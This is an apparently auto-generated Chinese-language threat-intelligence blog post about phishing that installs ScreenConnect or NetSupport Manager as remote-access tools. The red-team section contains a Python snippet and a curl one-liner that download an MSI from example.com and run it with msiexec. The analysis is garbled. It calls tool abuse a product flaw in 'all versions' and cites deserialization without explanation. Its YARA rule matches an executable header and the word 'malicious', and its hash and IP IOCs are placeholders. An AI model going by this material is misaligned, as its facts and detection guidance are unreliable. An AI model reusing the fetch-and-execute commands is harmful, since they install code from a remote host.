---
layout: post
title:  "Intelligence Insights: February 2026"
date:   2026-02-20 01:25:11 +0000
categories: [security]
severity: high
---

# 🔥 解析 ScreenConnect 和 NetSupport Manager 的遠端管理工具漏洞利用
> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: High (CVSS: 8.8)
> * **受駭指標**: RCE (Remote Code Execution)
> * **關鍵技術**: `Phishing`, `RAT` (Remote Access Tool), `Deserialization`

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: ScreenConnect 和 NetSupport Manager 的遠端管理工具存在漏洞，允許攻擊者通過 `Phishing` 攻擊下載和安裝惡意的 `MSI` 安裝包，從而實現遠端代碼執行。
* **攻擊流程圖解**: 
    1. 攻擊者發送 `Phishing` 郵件或 URL 連結給受害者。
    2. 受害者點擊連結或下載附件，下載惡意的 `MSI` 安裝包。
    3. 惡意的 `MSI` 安裝包安裝 ScreenConnect 或 NetSupport Manager。
    4. 攻擊者通過遠端管理工具控制受害者的系統。
* **受影響元件**: ScreenConnect 和 NetSupport Manager 的所有版本。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需要有受害者的系統權限。
* **Payload 建構邏輯**:

    ```
    
    python
    import os
    import subprocess
    
    # 下載惡意的 MSI 安裝包
    url = "https://example.com/malicious.msi"
    subprocess.run(["powershell", "-c", f"Invoke-WebRequest -Uri {url} -OutFile malicious.msi"])
    
    # 安裝 ScreenConnect 或 NetSupport Manager
    subprocess.run(["msiexec", "/i", "malicious.msi"])
    
    ```
    * **範例指令**: `curl https://example.com/malicious.msi -o malicious.msi && msiexec /i malicious.msi`
* **繞過技術**: 攻擊者可以使用 `Phishing` 攻擊和 `RAT` 工具來繞過安全防護。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| 1234567890abcdef | 192.168.1.100 | example.com | C:\Windows\Temp\malicious.msi |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule malicious_msi {
        meta:
            description = "Detects malicious MSI files"
            author = "Your Name"
        strings:
            $msi_header = { 4d 5a }
            $malicious_code = { 6d 61 6c 69 63 69 6f 75 73 }
        condition:
            $msi_header at 0 and $malicious_code
    }
    
    ```
    * **SIEM 查詢語法**: `SELECT * FROM events WHERE event_type = 'malicious_msi'`
* **緩解措施**: 更新 ScreenConnect 和 NetSupport Manager 至最新版本，使用強密碼和雙因素認證，限制系統權限。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **Phishing (釣魚攻擊)**: 一種社交工程攻擊，攻擊者通過電子郵件或其他方式欺騙受害者下載或安裝惡意軟件。
* **RAT (遠端存取工具)**: 一種允許攻擊者遠端控制受害者系統的工具。
* **Deserialization (反序列化)**: 一種將數據從序列化格式轉換回原始格式的過程，可能會導致安全漏洞。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://redcanary.com/blog/threat-intelligence/intelligence-insights-february-2026/)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1204/)


